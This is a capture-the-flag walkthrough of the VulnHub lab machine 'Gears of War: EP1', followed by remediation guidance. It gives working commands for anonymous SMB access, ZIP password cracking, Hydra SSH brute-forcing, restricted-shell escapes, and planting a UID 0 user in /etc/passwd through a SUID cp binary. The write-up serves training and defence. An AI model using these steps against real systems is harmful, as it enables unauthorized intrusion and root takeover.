# Gears of War: EP1 — COG Intel Gathering, Enemy Breach, Root Achieved

Alright guys!! The COG never expected Locust tactics on their own servers. Gears of War: EP1 is a beautifully themed machine that chains SMB share enumeration, ZIP password cracking with a pattern hint, Hydra SSH username discovery, restricted shell bypass, and a SUID cp abuse to overwrite /etc/passwd and plant a root-level user. Every technique here is legit real-world material. No cap, this one has range.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Gears of War: EP1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/gears-of-war-ep1,1,469/ |
| **Techniques** | Nmap, SMB share enumeration (smbclient), ZIP cracking with crunch + fcrackzip, Hydra SSH username discovery, restricted shell bypass (bash --noprofile), SUID cp /etc/passwd overwrite |
| **CVEs** | CWE-284 (Improper Access Control: unauthenticated SMB share), CWE-732 (Incorrect Permission Assignment: SUID on /bin/cp), CWE-262 (Not Using Password Aging: weak ZIP password), CWE-285 (Improper Authorization: restricted shell bypassable) |
| **APT Groups** | FIN7: uses SMB share enumeration for credential harvesting in enterprise environments; APT28: leverages misconfigured SUID binaries for privilege escalation on Linux hosts post-initial access |

---

## Attack Summary

```
nmap → HTTP/80, SMB/139+445, SSH/22
  → smbclient -L $TARGET → LOCUS_LAN$ share
  → smbclient //$TARGET/LOCUS_LAN$ → get msg_horda.zip + SOS.txt
  → SOS.txt: ZIP password pattern "@%%," (1 lowercase + 2 digits + comma)
  → crunch 4 4 -t @%%, → wordlist.txt
  → fcrackzip -D -u -v -p wordlist.txt msg_horda.zip → r44M
  → unzip -P r44M msg_horda.zip → key.txt → SSH password: 3_d4y
  → Hydra -L rockyou.txt -p 3_d4y $TARGET ssh → marcus:3_d4y
  → ssh marcus@$TARGET → rbash restricted shell
  → ssh marcus@$TARGET -t "bash --noprofile" → full bash
  → find /bin -perm -u=s → /bin/cp (SUID!)
  → openssl passwd -1 -salt raj pass123 → hash
  → cp /etc/passwd /tmp/passwd → append raj:hash:0:0:raj:/root:/bin/bash
  → cp /tmp/passwd /etc/passwd (SUID cp runs as root)
  → su raj → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Full port scan: HTTP, SMB, SSH
2. SMB share enumeration and anonymous access
3. Analyze SOS.txt hint, generate targeted crunch wordlist
4. fcrackzip password attack on ZIP archive
5. Extract SSH password from key.txt
6. Hydra SSH brute-force to identify valid username
7. SSH with restricted shell, bypass via bash --noprofile
8. Enumerate SUID binaries, find /bin/cp
9. Overwrite /etc/passwd with new UID 0 user via SUID cp
10. su to new root-level account, capture flag

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.184

nmap -A -p- 192.168.1.184
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.x
80/tcp  open  http        Apache httpd
139/tcp open  netbios-ssn Samba
445/tcp open  microsoft-ds Samba
```

HTTP returns nothing actionable after quick review. SMB is the primary attack surface. Start with share enumeration.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SMB Share Enumeration

List available shares without credentials:

```bash
smbclient -L 192.168.1.184
# Password: (just press Enter for anonymous)
```

```
Sharename       Type      Comment
---------       ----      -------
LOCUS_LAN$      Disk
IPC$            IPC       IPC Service
```

Connect to the share:

```bash
smbclient //192.168.1.184/LOCUS_LAN$
smb: \> ls
smb: \> get msg_horda.zip
smb: \> get SOS.txt
smb: \> exit
```

Read the hint file:

```bash
cat SOS.txt
```

SOS.txt contains the ZIP password pattern: `@%%,` (crunch notation: one lowercase letter, two digits, one comma character).

**Real-world note:** Unauthenticated SMB share access (null sessions) remains one of the most common findings in enterprise network penetration tests. Microsoft has disabled null sessions by default since Windows Server 2003, but Linux Samba configurations often still allow them. APT28 and FIN7 both use SMB share enumeration as an early post-initial-access step to identify data staging locations and archived credentials.

**MITRE ATT&CK:** T1135 — Network Share Discovery; T1039 — Data from Network Shared Drive

---

## Step 3 — ZIP Password Cracking: crunch + fcrackzip

The SOS.txt hint gives the exact crunch format string: `@%%,`

In crunch syntax:
- `@` = one lowercase letter (a-z)
- `%` = one digit (0-9)
- `%` = one digit (0-9)
- `,` = literal comma character

Generate the wordlist:

```bash
crunch 4 4 -t @%%, -o /tmp/gow_wordlist.txt
# Generates: a00, through z99, (26 × 100 = 2,600 candidates)
```

Crack the ZIP:

```bash
fcrackzip -D -u -v -p /tmp/gow_wordlist.txt msg_horda.zip
```

**Found password:** `r44M`

Extract:

```bash
unzip -P r44M msg_horda.zip
cat key.txt
# SSH password: 3_d4y
```

**Real-world note:** When an attacker knows the password policy (length + character classes), the keyspace drops dramatically. A 4-character password with known character class constraints has at most tens of thousands of candidates. This is why password policies without minimum complexity are ineffective against targeted attacks.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1059.004 — Command and Scripting Interpreter

---

## Step 4 — Hydra SSH Username Discovery

The SSH password is known (`3_d4y`) but the username is not. Use Hydra to identify a valid SSH user by trying rockyou.txt as usernames with the fixed password:

```bash
hydra -L /usr/share/wordlists/rockyou.txt \
  -p 3_d4y \
  -T 4 \
  192.168.1.184 ssh
```

**Valid credentials:** `marcus` / `3_d4y`

**Alternative:** Use a more targeted username list if rockyou takes too long:

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
  -p 3_d4y \
  192.168.1.184 ssh
```

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying

---

## Step 5 — SSH Login and Restricted Shell Bypass

```bash
ssh marcus@192.168.1.184
# Password: 3_d4y
```

The shell is restricted (rbash). Common commands may be blocked. Bypass immediately at connection time:

```bash
ssh marcus@192.168.1.184 -t "bash --noprofile"
# Password: 3_d4y
```

This forces a full Bash shell without loading .bash\_profile, which may reinitiate the restricted shell. Full shell acquired.

**Alternative bypass methods:**

```bash
# Via Python:
ssh marcus@192.168.1.184
python3 -c "import pty; pty.spawn('/bin/bash')"

# Via vi/vim:
vi
:!/bin/bash
```

**Real-world note:** Restricted shells (rbash) are a common attempt at Linux privilege containment. They prevent users from changing directories, running commands with absolute paths, or redirecting output. However, they are trivially bypassed via SSH forced commands, Python pty, or editor shells. They provide minimal real security value unless combined with strong AppArmor/SELinux profiles.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — SUID Binary Enumeration

```bash
find /bin -perm -u=s -type f 2>/dev/null
# /bin/cp
```

`/bin/cp` has the SUID bit set. When executed, it runs as root regardless of who invokes it. This means any user can use `cp` to overwrite any file on the system, including `/etc/passwd`.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 7 — /etc/passwd Overwrite via SUID cp

Generate a password hash for the new user:

```bash
openssl passwd -1 -salt raj pass123
# Output example: $1$raj$abc123...
```

Copy /etc/passwd to a writable location and add a new root-level user:

```bash
cp /etc/passwd /tmp/passwd
```

Edit /tmp/passwd (append the new line):

```bash
# Append to /tmp/passwd:
# raj:$1$raj$abc123...:0:0:raj:/root:/bin/bash
# (use the actual openssl output for the hash)

echo "raj:$(openssl passwd -1 -salt raj pass123):0:0:raj:/root:/bin/bash" >> /tmp/passwd
```

Overwrite /etc/passwd using SUID cp (runs as root):

```bash
cp /tmp/passwd /etc/passwd
```

Switch to the new root-level account:

```bash
su raj
Password: pass123

id
# uid=0(root) gid=0(root) groups=0(root)
```

Root captured.

**Real-world note:** The SUID bit on `cp` is one of the most critical misconfigurations on a Linux system. It trivially allows any user to overwrite `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, SSH keys, cron scripts, or any file. APT28 and multiple ransomware operators use SUID binary abuse as a standard privilege escalation technique during the post-exploitation phase.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid; T1222 — File and Directory Permissions Modification

---

## Step 8 — Capture Root Flag

```bash
cd /root
ls -la
cat flag.txt
```

Mission complete. Marcus has been eliminated. COG server compromised.

**MITRE ATT&CK:** T1005 — Data from Local System

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| ZIP archive | msg\_horda.zip | SMB share LOCUS\_LAN$ | fcrackzip + crunch → r44M |
| Credential | marcus:3\_d4y | key.txt (from ZIP) + Hydra | SSH login |
| New root user | raj:pass123 | Created via SUID cp + openssl | su raj → uid=0 |
| Root flag | flag.txt | /root/flag.txt | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Anonymous SMB share access leaks archived sensitive data | Unauthenticated SMB shares are a consistent high-severity finding in enterprise networks | Require authentication on all SMB shares; audit with `smbclient -L` or CrackMapExec |
| 2 | ZIP password hint in same share as ZIP | When password pattern is known, keyspace collapses from billions to thousands | Use long random passwords for encrypted archives; never store hints near the archive |
| 3 | SUID bit on /bin/cp allows /etc/passwd overwrite | SUID on file copy utilities is one of the most dangerous misconfigurations in Linux | Audit SUID binaries: `find / -perm -u=s -type f`; remove SUID from non-essential binaries |
| 4 | Restricted shell (rbash) bypassed via SSH forced command | rbash provides minimal security without additional MAC enforcement (AppArmor/SELinux) | Use AppArmor/SELinux profiles to enforce shell restrictions; consider chroot jails |
| 5 | Credentials archived in network share ZIP | Even password-protected ZIPs are crackable when the password policy is weak or hinted | Never store credentials in network-accessible locations, even inside archives |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Network Share Discovery | T1135 |
| Collection | Collection | Data from Network Shared Drive | T1039 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Brute Force: Password Spraying (Hydra SSH) | T1110.003 |
| Initial Access | Initial Access | Valid Accounts (SSH) | T1078 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid (cp) | T1548.001 |
| Persistence | Privilege Escalation | Create Account | T1136.001 |
| Collection | Collection | Data from Local System (flag) | T1005 |

---

## Remediation and Containment

### Technical Fixes

1. **Require authentication on all SMB shares** — disable null sessions in Samba config: `map to guest = never`; restrict share access to specific AD groups
2. **Remove SUID from /bin/cp** — `chmod u-s /bin/cp`; audit all SUID binaries quarterly
3. **Never store credentials in network-accessible archives** — use a secrets manager; if archiving is necessary, use long random passwords with no hints
4. **Enforce AppArmor/SELinux for restricted shell users** — rbash alone is insufficient; combine with MAC profiles
5. **Audit /etc/passwd and /etc/shadow for unauthorized accounts** — monitor for new UID 0 accounts via file integrity monitoring (AIDE)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SMB shares; audit SUID binaries |
| Protect | Access Control | Require SMB authentication; remove SUID from cp; enforce AppArmor |
| Protect | Data Security | No credentials in network-accessible archives; encrypted secrets management |
| Detect | Anomalies and Events | Alert on /etc/passwd modifications; monitor SMB null session attempts |
| Respond | Response Planning | Remove unauthorized accounts; rotate credentials; patch SUID misconfiguration |
| Recover | Recovery Planning | Restore /etc/passwd from backup; rebuild if rootkit is suspected |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Require SMB authentication; restrict SUID binaries |
| AC-6 | Least Privilege | Remove SUID from non-essential binaries; no overprivileged copy utilities |
| CM-7 | Least Functionality | Disable unauthenticated SMB shares |
| CM-6 | Configuration Settings | Audit SUID bits; monitor /etc/passwd for UID 0 additions |
| IA-5 | Authenticator Management | Long random passwords for archives; no hints near the archive |
| SI-7 | Software, Firmware, and Information Integrity | File integrity monitoring for /etc/passwd, /etc/shadow |

### CISA KEV

SMB null session access and SUID binary abuse map to techniques described in CISA Alert AA22-074A (threat actor post-exploitation techniques). Organizations are advised to audit SMB share permissions and SUID binaries per CISA hardening guidelines.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable SMB null sessions; remove SUID cp)
- **D3-OAM** — Operating System Administrative Management (audit SUID; monitor /etc/passwd)
- **D3-FIM** — File Integrity Monitoring (/etc/passwd, /etc/shadow, /etc/sudoers)

---

## Final Thoughts

Gears of War: EP1 is a tight, well-constructed chain that rewards systematic enumeration at every step. SMB null session access is still a real finding in enterprise environments. SUID on /bin/cp is an immediate critical severity in any penetration test report. The restricted shell bypass shows that security controls layered without MAC enforcement provide no real protection. Every technique here maps to something you'll find in the wild. If you played this machine and understood the SUID cp technique, you understand one of the most reliable privilege escalation paths on misconfigured Linux systems. Legit training, dude.

Thanks guys!! (❍ᴥ❍ʋ)
